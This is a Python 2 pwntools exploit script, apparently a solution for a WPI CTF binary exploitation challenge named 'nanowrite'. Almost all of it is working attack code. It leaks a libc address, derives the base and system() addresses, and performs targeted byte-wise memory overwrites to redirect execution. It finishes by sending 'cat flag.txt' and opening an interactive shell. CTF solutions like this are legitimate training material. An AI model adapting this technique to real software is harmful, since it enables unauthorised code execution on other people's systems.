#!/bin/python2
from pwn import *


#/a.out test.txt 0x74a53352d000 0x64e80 0x10a38c

start = 0x64e80
#end = 0x10a38c
end = 0x4f322
#end = 0x4f2c5
#end = 0x0004f2b7


s = process("./nanowrite")
#s = remote("dorsia4.wpictf.xyz", 31339)
addr = int(s.recvline().strip().split(' ')[0], 16)
#addr = 0x7018a2c3a38c
print("Addr is " + hex(addr))
sysaddr = addr - 765772
printaddr = addr - 0xa550c
baseaddr = addr - 0x0010a38c


pather = process(["./libcpather", "./test.txt", hex(baseaddr), hex(start), hex(end)])
pather.recvuntil("GOOOOAL")
addrs = pather.recvall().splitlines()
addrs.reverse()
addrs.remove("")
print(addrs)

print("System() is " + hex(sysaddr))
print("print() is " + hex(printaddr))
print("base is " + hex(baseaddr))
offset = -104

def dowrite(what, where):
	byte = what
	pprint(str(where) + " " + hex(byte))
	s.writeline(str(where) + " " + hex(byte))
	return(s.recvline(timeout=1))

#for i in range(0,70):
#	dowrite(0,i)


#sleep(10)

prevaddr = printaddr
for x in addrs:
	num = int(x.strip(), 16)
	if prevaddr == num: continue
	oldb = p64(prevaddr)
	newb = p64(num)
	prevaddr = num
	for i,x in enumerate(oldb):
		if newb[i] != oldb[i]:
			idx = i
			dat = u8(newb[idx])
			break
	print("{} {} {}".format(hex(num), idx, hex(dat)))
	dowrite(dat, idx+offset)

#quit()



#offset = -136
#offset = 0
#addr = 0xBBBBBBBBBBBB
#offset = -112
#for i,x in enumerate(p64(addr)):
#	byte = u8(x)
#	pprint(str(offset+i) + " " + hex(byte))
#	s.writeline(str(offset+i) + " " + hex(byte))
#	print(s.recvline())

#dowrite(0, 100)
s.writeline("cat flag.txt")
s.interactive()
